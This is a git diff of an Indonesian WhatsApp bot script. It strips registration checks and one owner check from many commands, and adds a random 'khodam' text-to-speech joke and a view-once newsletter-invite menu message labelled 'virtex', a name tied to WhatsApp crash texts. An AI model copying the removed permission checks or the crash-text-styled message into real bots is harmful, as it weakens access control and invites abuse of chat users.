     await sych.groupLeave(m.chat).then(() => sych.sendFromOwner(owner, 'Sukses Keluar Dari Grup', m, {
         contextInfo: {
             isForwarded: true
@@ -1513,7 +8948,7 @@ break;
 case 'block':
 case 'blokir': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text && !m.quoted) {
         sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
     } else {
@@ -1524,7 +8959,7 @@ case 'blokir': {
 break;
 
 case 'listblock': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     let anu = await sych.fetchBlocklist();
     sycreply(`Total Block : ${anu.length}\n` + anu.map(v => '• ' + v.replace(/@.+/, '')).join`\n`);
 }
@@ -1535,7 +8970,7 @@ case 'openblock':
 case 'openblokir':
 case 'unblokir': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text && !m.quoted) {
         sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
     } else {
@@ -1547,7 +8982,7 @@ break;
 
 case 'adduang': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!args[0] || !args[1] || isNaN(args[1])) return sycreply(`Kirim/tag Nomernya!\n*< / >* Example:\n${prefix + command} 62xxx 1000`);
     const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
     const onWa = await sych.onWhatsApp(nmrnya);
@@ -1583,7 +9018,7 @@ break;
 }
 break
 			case 'listpc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
@@ -1600,7 +9035,7 @@ break
 }
 break;
 		case 'listgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id);
@@ -1615,7 +9050,7 @@ break;
 }
 break;
 		case 'setmenu': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     if (!text) return sycreply(`There are 8 menu(s1,s2,s3,s4,s5,s6,s7,s8,s9)\nPlease select one\nExample ${prefix + command} s1`);
@@ -1630,7 +9065,7 @@ break;
 
 case 'creategc':
 case 'buatgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     if (!text) return sycreply(`*< / >* Example:\n${prefix + command} *Nama Gc*`);
 
@@ -1653,7 +9088,7 @@ break;
 			case 'addpr':
 case 'addprem':
 case 'addpremium': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     if (!text) return sycreply(`*< / >* Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30 hari`);
@@ -1679,7 +9114,7 @@ break;
 case 'delpr':
 case 'delprem':
 case 'delpremium': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     if (!text) return sycreply(`*< / >* Example:\n${prefix + command} @tag`);
@@ -1701,7 +9136,7 @@ break;
 			case 'listpr':
 case 'listprem':
 case 'listpremium': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     
     let txt = `*------「 LIST PREMIUM 」------*\n\n`;
@@ -1713,7 +9148,7 @@ case 'listpremium': {
 break;
 
 case 'upsw': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
 
     const statusJidList = Object.keys(db.users);
@@ -1769,7 +9204,7 @@ case 'upsw': {
 break;
 
 case 'addcase': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     if (!text && !text.startsWith('case')) return sycreply('Masukkan Casenya!');
     
@@ -1795,7 +9230,7 @@ case 'addcase': {
 }
 break;
 			case 'getcase': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     if (!text) return sycreply('Masukkan Nama Casenya!');
     try {
@@ -1810,7 +9245,7 @@ break;
 break;
 
 case 'delcase': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     if (!text) return sycreply('Masukkan Nama Casenya!');
     fs.readFile('naze.js', 'utf8', (err, data) => {
@@ -1831,7 +9266,7 @@ case 'delcase': {
 }
 break;
 			case 'getsession': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     await sych.sendMessage(m.chat, {
         document: fs.readFileSync('./nazedev/creds.json'),
@@ -1845,7 +9280,7 @@ break;
 
 case 'deletesession':
 case 'delsession': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     fs.readdir('./nazedev', async function(err, files) {
         if (err) {
@@ -1875,7 +9310,7 @@ case 'delsession': {
 break;
 			case 'deletesampah':
 case 'delsampah': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     fs.readdir('./database/sampah', async function(err, files) {
         if (err) {
@@ -1906,8 +9341,8 @@ break;
 			case 'scc':
 case 'script':
 case 'esce': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
-    if (!isCreator) return sycreply(mess.owner);
+     
+    
 
     const iniesce = `https://github.com/sychyy/sychee\n⬆️ Itu Sc nya cuy`;
 
@@ -1946,7 +9381,7 @@ case 'd': {
 }
 			// Group Menu
 			case 'add': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sycreply(mess.owner);
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
@@ -1990,7 +9425,7 @@ case 'd': {
 }
 break;
 			case 'kick': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2004,7 +9439,7 @@ break;
 break;
 
 case 'promote': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2018,7 +9453,7 @@ case 'promote': {
 break;
 
 case 'demote': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2034,7 +9469,7 @@ break;
 case 'setnamegc':
 case 'setsubject':
 case 'setsubjectgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2051,7 +9486,7 @@ case 'setdesc':
 case 'setdescgc':
 case 'setdesk':
 case 'setdeskgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2067,7 +9502,7 @@ break;
 case 'setppgroups':
 case 'setppgrup':
 case 'setppgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2107,7 +9542,7 @@ break;
 			case 'delete':
 case 'del':
 case 'd': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.quoted) return sycreply('Reply pesan yang mau di delete');
     await sych.sendMessage(m.chat, {
         delete: {
@@ -2126,7 +9561,7 @@ case 'linkgc':
 case 'urlgroup':
 case 'urlgrup':
 case 'urlgc': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2140,10 +9575,12 @@ case 'urlgc': {
 }
 break;
 
+
+
 case 'revoke':
 case 'newlink':
 case 'newurl': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2153,9 +9590,10 @@ case 'newurl': {
 }
 break;
 
+
 case 'gc':
 case 'grup': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sycreply(mess.group);
     if (!m.isAdmin) return sycreply(mess.admin);
     if (!m.isBotAdmin) return sycreply(mess.botAdmin);
@@ -2171,11 +9609,11 @@ case 'grup': {
 					case 'antivirtex':
 					case 'antidelete':
 					case 'welcome':
-					case 'mute':
+				    case 'mute':
 					case 'antitoxic':
 					case 'waktusholat':
 					case 'nsfw':
-					    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+					     
 						if (teks[1] == 'on' || teks[1] == 'true') {
 							if (set[teks[0]]) return sycreply('*Sudah Aktif Sebelumnya*')
 							set[teks[0]] = true
@@ -2193,7 +9631,7 @@ case 'grup': {
 			}
 			break
 			case 'tagall': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply(mess.group)
 				if (!m.isAdmin) return sycreply(mess.admin)
 				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
@@ -2212,7 +9650,7 @@ case 'grup': {
 			break
 			case 'hidetag':
 			case 'h': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply(mess.group)
 				if (!m.isAdmin) return sycreply(mess.admin)
 				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
@@ -2225,7 +9663,7 @@ case 'grup': {
 			}
 			break
 			case 'totag': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply(mess.group)
 				if (!m.isAdmin) return sycreply(mess.admin)
 				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
@@ -2239,7 +9677,7 @@ case 'grup': {
 			break
 			case 'listonline':
 			case 'liston': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply(mess.group)
 				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 				if (!store.presences || !store.presences[id]) return sycreply('Sedang Tidak ada yang online!')
@@ -2252,76 +9690,598 @@ case 'grup': {
 				}).catch((e) => sycreply('Gagal'))
 			}
 			break
+			//cekkhodam
+			case 'cekkodam2':{
+    const defaultLang = 'id';
+    const gtts = require( 'node-gtts')
+    // Penanganan input nama
+    let lana;
+    if (args.length === 0 || !args[0]) {
+        return sycreply('Harap masukkan nama kamu.');
+    } else {
+        lana = args[0];
+    }
+
+    let lang = args[1];
+    if (!lang || lang.length !== 2) {
+        lang = defaultLang;
+    }
+    
+    const khodam = [
+  "Singa",
+  "kosoong atau tidak ada",
+  "Harimau",
+  "Elang",
+  "Serigala",
+  "Naga",
+  "Gajah",
+  "Kuda",
+  "Macan Tutul",
+  "Kerbau",
+  "Burung Hantu",
+  "Burung Rajawali",
+  "Ikan Hiu",
+  "Lumba-Lumba",
+  "Ular",
+  "Kura-Kura",
+  "Tupai",
+  "Paus",
+  "Kelelawar",
+  "Kijang",
+  "Banteng",
+  "Rusa",
+  "Anjing",
+  "Kucing",
+  "Buaya",
+  "Kambing",
+  "Kuda Nil",
+  "Bebek",
+  "Angsa",
+  "Ayam",
+  "Merpati",
+  "Burung Beo",
+  "Burung Kenari",
+  "Burung Kakatua",
+  "Bunglon",
+  "Cicak",
+  "Kodok",
+  "Katak",
+  "Tikus",
+  "Landak",
+  "Kanguru",
+  "Koala",
+  "Panda",
+  "Beruang",
+  "Rubah",
+  "Lynx",
+  "Leopard",
+  "Jaguar",
+  "Cheetah",
+  "Badak",
+  "Zebra",
+  "Antelop",
+  "Unta",
+  "Alpaka",
+  "Llama",
+  "Serigala Abu-abu",
+  "Serigala Merah",
+  "Serigala Putih",
+  "Lynx",
+  "Harimau Putih",
+  "Harimau Siberia",
+  "Harimau Sumatra",
+  "Gorila",
+  "Orangutan",
+  "Simpanse",
+  "Monyet",
+  "Babun",
+  "Lemur",
+  "Iguana",
+  "Komodo",
+  "Salamander",
+  "Belut",
+  "Sotong",
+  "Gurita",
+  "Kepiting",
+  "Lobster",
+  "Udang",
+  "Kupu-kupu",
+  "Lebah",
+  "Tawon",
+  "Kumbang",
+  "Belalang",
+  "Jangkrik",
+  "Semut",
+  "Kecoak",
+  "Laba-laba",
+  "Kalajengking",
+  "Serangga Tongkat",
+  "Naga Laut",
+  "Kuda Laut",
+  "Duyung",
+  "Putri Duyung",
+  "Burung Kolibri",
+  "Burung Hantu Salju",
+  "Burung Puyuh",
+  "Burung Gagak",
+  "Burung Pelikan",
+  "Burung Albatros",
+  "Burung Flamingo",
+  "Burung Hering",
+  "Burung Camar",
+  "Burung Pinguin",
+    "Cincin",
+    "Batu Akik",
+    "Keris",
+    "Tongkat",
+    "Pusaka",
+    "Patung",
+    "Mustika",
+    "Tasbih",
+    "Kalung",
+    "Gelang",
+    "Permata",
+    "Pedang",
+    "Mata Uang",
+    "Wesi Kuning",
+    "Serat Tali",
+    "Belati",
+    "Cundrik",
+    "Selendang",
+    "Jarum",
+    "Tombak",
+    "Kerikil",
+    "Kendi",
+    "Kain Kafan",
+    "Topi",
+    "Payung",
+    "Sandal",
+    "Kacamata",
+    "Sabuk",
+    "Sarung",
+    "Tali Ikat Pinggang",
+    "Surat",
+    "Kunci",
+    "Lilin",
+    "Peniti",
+    "Sisir",
+    "Cermin",
+    "Kendi Air",
+    "Piring",
+    "Gelas",
+    "Mangkuk",
+    "Sendok",
+    "Sapu",
+    "Gayung",
+    "Tikar",
+    "Bantal",
+    "Guci",
+    "Lentera",
+    "Lampu",
+    "Buku",
+    "Pena",
+    "Dupa",
+    "Asbak",
+    "Cangkir",
+    "Gantungan Kunci",
+    "Kalender",
+    "Sepeda",
+    "Lukisan",
+    "Batu Kerikil",
+    "Batu Kali",
+    "Kipas",
+    "Peci",
+    "Sorban",
+    "Rokok",
+    "Topeng",
+    "Gamelan",
+    "Angklung",
+    "Suling",
+    "Wayang",
+    "Kuda-Kudaan",
+    "Sepatu",
+    "Jam Tangan",
+    "Kosong atau tidak adaa"
+];
+
+
+    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
+    let text = `Khodam ${lana} adalah ${randomKhodam}`;
+function tts(text, lang = 'id') {
+return new Promise((resolve, reject) => {
+try {
+let tts = gtts(lang)
+let filePath =  (1 * new Date) + '.mp3'
+tts.save(filePath, text, () => {
+resolve(fs.readFileSync(filePath))
+fs.unlinkSync(filePath)
+})
+} catch (e) { reject(e) }
+})
+}    
+    
+
+
+    let res;
+    try {
+        res = await tts(text, lang);
+    } catch (e) {
+        sycreply(e + '');
+        res = await tts(text, defaultLang);
+    } finally {
+        sycreply(text)
+        if (res) {
+await sych.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: fkontak });
+        }
+    }
+};
+break
+
+
 			// Bot Menu
-			case 'ppk': {
+			
+			//RECODEEEEE BY GALANG
+			
+	
+
+case 'm1': {
+
+
+    try {
+        console.log(chalk.blue.bold('Mengirim lokasi...'));
+
+        // URL gambar yang akan digunakan sebagai thumbnail
+        const imageUrl = "https://raw.githubusercontent.com/Galangxyz/Store/gh-pages/rka.jpg";
+
+        // Mengambil buffer gambar dari URL
+        const imageBuffer = await getBuffer(imageUrl); 
+        console.log("imageBuffer (before Uint8Array conversion):", imageBuffer);
+
+        // Konversi ke Uint8Array agar sesuai dengan jpegThumbnail
+        const jpegThumbnail = new Uint8Array(imageBuffer);
+
+        // Simpan ke file JSON untuk analisis
+        fs.writeFileSync('imageBuffer.json', JSON.stringify([...jpegThumbnail], null, 2));
+        console.log("Array jpegThumbnail berhasil disimpan ke imageBuffer.json");
+
+        // Debugging array lengkap
+        console.dir(jpegThumbnail, { maxArrayLength: null });
+
+        // Membuat pesan dengan jpegThumbnail yang benar
+        let locationMsg = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "newsletterAdminInviteMessage": {
+                        "newsletterJid": `120363396726721623@newsletter`,
+                        "newsletterName": "virtex",
+                        "jpegThumbnail": jpegThumbnail, // Menggunakan Uint8Array yang valid
+                        "caption": "> virtex",
+                        serverMessageId: 143,
+                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
+                    }
+                }
+            }
+        }, { userJid: m.chat, quoted: fkontak });
+
+        console.log("locationMsg:", locationMsg);
+
+    let buttons = [
+        {
+            buttonId: `${prefix}pubg`,
+            buttonText: { displayText: "Pubg" },
+            type: 1
+        },
+        {
+            buttonId: `${prefix}ff`,
+            buttonText: { displayText: "Free Fire" },
+            type: 1
+        },
+        {
+            buttonId: `${prefix}ml`,
+            buttonText: { displayText: "Mobile Legend" },
+            type: 1
+        }
+    ];
+
+    let buttonMessage = {
+        text: "Silahkan pilih *option* di bawah ini",
+        footer: "©Langz",
+        buttons: buttons,
+        headerType: 1,
+        contextInfo: {
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
+                newsletterJid: "120363373320014871@newsletter",
+                serverMessageId: 143
+            }
+        }
+    };
+
+    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
+    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
+
+        // Tunggu beberapa detik sebelum mengirim pesan kedua (agar tidak spam)
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        console.log(chalk.green.bold('Mengirim pesan menu...'));
+
+        let sections = [{
+            title: 'Select Menu',
+            highlight_label: 'Recommended',
+            rows: [
+                { title: `${prefix}Allmenu`, description: `Daftar semua menu yang tersedia.`, id: `${prefix}allmenu` },
+                { title: `${prefix}Downloadmenu`, description: `Menu untuk mendownload media.`, id: `${prefix}downloadmenu` },
+                { title: `${prefix}Ownermenu`, description: `Menu khusus untuk owner.`, id: `${prefix}ownermenu` },
+                { title: `${prefix}Groupmenu`, description: `Menu untuk pengelolaan grup.`, id: `${prefix}groupmenu` },
+                { title: `${prefix}Funmenu`, description: `Menu hiburan dengan berbagai fitur.`, id: `${prefix}funmenu` },
+                { title: `${prefix}Gamemenu`, description: `Menu untuk bermain game.`, id: `${prefix}gamemenu` },
+                { title: `${prefix}Aimenu`, description: `Menu AI dan fitur kecerdasan buatan.`, id: `${prefix}aimenu` },
+                { title: `${prefix}Toolsmenu`, description: `Menu berisi berbagai tools.`, id: `${prefix}toolsmenu` }
+            ]
+        }];
+
+        let listMessage = {
+            title: 'Select Menu',
+            sections
+        };
+
+        let msg = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "messageContextInfo": {
+                        "deviceListMetadata": {},
+                        "deviceListMetadataVersion": 2
+                    },
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        contextInfo: {
+                            mentionedJid: [m.sender],
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: '120363373320014871@newsletter',
+                                newsletterName: 'Powered By Galangxyz',
+                                serverMessageId: -1
+                            },
+                            businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) }
+                        },
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: `🔰 Silakan pilih menu berikut:`
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: `⚡ Powered by Langz Bot`
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            locationMessage: {
+                                degreesLatitude: 40.712776,
+                                degreesLongitude: -74.005974,
+                                name: "New York City, USA",
+                                address: "Times Square, New York, USA"
+                            },
+                            title: `> Follow my GitHub: https://github.com/Galangxyz`,
+                            subtitle: "",
+                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg" } }, { upload: sych.waUploadToServer }))
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: [
+                                { name: "single_select", buttonParamsJson: JSON.stringify(listMessage) },
+                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Profile Side", url: "https://profile.galng.my.id/", merchant_url: "https://www.google.com" }) },
+                                { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "Phone Number", phone_number: "+6283833735020" }) },
+                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Ping Bot", id: `${prefix}ping` }) },
+                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Contact Owner", id: `${prefix}pepek` }) }
+                            ]
+                        })
+                    })
+                }
+            }
+        }, { quoted: fkontak });
+
+        await sych.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
+
+        console.log(chalk.green.bold('Pesan case "m1" berhasil dikirim.'));
+    } catch (err) {
+        console.error(chalk.red.bold('Error di case "m1":'), err);
+    }
+}
+break;
+
+
+
+
+
+		case 'menuk': {
   try {
     // Pengecekan isRegistered
     if (!isRegistered) {
       return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
     }
 
+    // Struktur list untuk menu pilihan
+    let sections = [
+      {
+        title: 'Select Menu',
+        highlight_label: 'Powered by Galangxyz',
+        rows: [
+          {
+            title: 'Ping Bot',
+            description: 'Ping Bot 🟢',
+            id: 'ping'
+          },
+          {
+            title: 'Runtime',
+            description: 'Menampilkan info Runtime 🤖',
+            id: 'call'
+          }
+        ]
+      }
+    ];
+
+    let listMessage = {
+      title: 'Select Menu',
+      sections
+    };
+
+    // Header tambahan setelah single select
+    // Tambahkan sections untuk CIMB Niaga
+let sectionsCIMB = [
+  {
+    title: "Select Menu",
+    highlight_label: 'Powered by Galangxyz',
+    rows: [
+      {
+        title: "Motivasi",
+        description: "Kumpulan Motivasi ⚔️",
+        id: "motivasi"
+      },
+      {
+        title: "Quotes",
+        description: "Kumpulan Quotes ⚖️",
+        id: "quotes"
+      },
+            {
+        title: "Dare",
+        description: "Dare (TOD) 💀",
+        id: "motivasi"
+      },
+            {
+        title: "Truth",
+        description: "Truth (TOD) 💀",
+        id: "motivasi"
+      },
+            {
+        title: "Renungan",
+        description: "Renungan 🗣️",
+        id: "motivasi"
+      }
+    ]
+  }
+];
+let listMessageCIMB = {
+      title: 'Select Menu',
+      sections: sectionsCIMB
+    };
+// Tambahkan sections untuk Bank Rakyat Indonesia
+let sectionsBRI = [
+  {
+    title: "Select Menu",
+    highlight_label: 'Powered by Galangxyz',
+    rows: [
+      {
+        title: "Claim",
+        description: "Claim Daily ✅",
+        id: "claim"
+      },
+            {
+        title: "Tagme",
+        description: "Tag Diri sendiri 📎",
+        id: "claim"
+      },
+      {
+        title: "Tagall",
+        description: "Tag Semua Orang 🔗",
+        id: "tagall"
+      }
+    ]
+  }
+];
+let listMessageBRI = {
+      title: 'Select Menu',
+      sections: sectionsBRI
+    };
+const name = getUserName(m.sender);
+const additionalHeaders = [
+  {
+    header: {
+      title: "> Kita adalah suatu kemungkinan yaang tidak mungkin.",
+      hasMediaAttachment: true,
+      imageMessage: (await generateWAMessageContent({
+        image: {
+          url: 'https://Galangxyz.github.io/bkp/f069d74b8025faaba10d9320bb05c175.jpg'
+        }
+      }, {
+        upload: sych.waUploadToServer
+      })).imageMessage
+    },
+    body: {
+      text: `> 【对象或字符串】`
+    },
+    footer: {
+      text: "\n\n请求加密Motivasi\n请求加密Quotes\n请求加密Dare\n请求加密Truth\n请求加密Renungan"
+    },
+    nativeFlowMessage: {
+      buttons: [
+                    {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify(listMessageCIMB)
+                        },
+                        {
+                            name: "quick_reply", // Tombol Quick Reply
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Ping Bot",
+                                id: `${prefix}ping`
+                            })
+                        },
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "✈Github",
+                                url: "https://github.com/Galangxyz",
+                                merchant_url: "https://www.google.com"
+                            })
+                        }
+      ]
+    }
+  },
+  {
+    header: {
+      title: "> Kagumi saja dia dari jauh, daripada dia tau lalu menjauh",
+      hasMediaAttachment: true,
+      imageMessage: (await generateWAMessageContent({
+        image: {
+          url: 'https://Galangxyz.github.io/bkp/5acef6a3a51cfcf3534b7f544a8921d0.jpg'
+        }
+      }, {
+        upload: sych.waUploadToServer
+      })).imageMessage
+    },
+    body: {
+      text: `> 【对象或字符串】`
+    },
+    footer: {
+      text: "\n\n\n\n\n请求加密Claim\n请求加密Tag All\n请求加密Tag Me"
+    },
+    nativeFlowMessage: {
+      buttons: [
+                    {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify(listMessageBRI)
+                        },
+                        {
+                            name: "quick_reply", // Tombol Quick Reply
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Ping Bot",
+                                id: `${prefix}ping`
+                            })
+                        },
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "✈Github",
+                                url: "https://github.com/Galangxyz",
+                                merchant_url: "https://www.google.com"
+                            })
+                        }
+      ]
+    }
+  }
+];
+
+    // Gabungkan semua header
     const carouselCards = [
       {
         header: {
-          title: "Mari Mampir",
-          hasMediaAttachment: true,
-          imageMessage: (await generateWAMessageContent({
-            image: {
-              url: './src/media/sych.png'
-            }
-          }, {
-            upload: sych.waUploadToServer
-          })).imageMessage
-        },
-        body: {
-          text: `> My Github`
-        },
-        footer: {
-          text: ""
-        },
-        nativeFlowMessage: {
-          buttons: [{
-            "name": "cta_url",
-            "buttonParamsJson": JSON.stringify({
-              display_text: `Galangxyz`, // ganti jadi (${owname})
-              url: `https://github.com/Galangxyz`
-            })
-          }]
-        }
-      },
-      {
-        header: {
-          title: "> Mari Mampir",
-          hasMediaAttachment: true,
-          imageMessage: (await generateWAMessageContent({
-            image: {
-              url: './src/media/sych.png'
-            }
-          }, {
-            upload: sych.waUploadToServer
-          })).imageMessage
-        },
-        body: {
-          text: `> Yang mau cek khodam boleh mampir`
-        },
-        footer: {
-          text: ""
-        },
-        nativeFlowMessage: {
-          buttons: [{
-            "name": "cta_url",
-            "buttonParamsJson": JSON.stringify({
-              display_text: `CekKhodam`, // ganti jadi (${owname})
-              url: `https://gachakhodam.vercel.app/`
-            })
-          }]
-        }
-      },
-      
-      // Header ketiga, pastikan ada tanda kurung yang benar
-      {
-        header: {
-          title: "> Mari Mampir",
+          title: `> Hi ${name} ${ucapanWaktu}`,
           hasMediaAttachment: true,
           imageMessage: (await generateWAMessageContent({
             image: {
@@ -2332,24 +10292,39 @@ case 'grup': {
           })).imageMessage
         },
         body: {
-          text: `> Portofolio`
+          text: `> 【对象或字符串】 `
         },
         footer: {
-          text: ""
+          text: "\n\n\n请求加密Ping Bot\n请求加密Runtime\n\n\n"
         },
         nativeFlowMessage: {
-          buttons: [{
-            name: "cta_url",
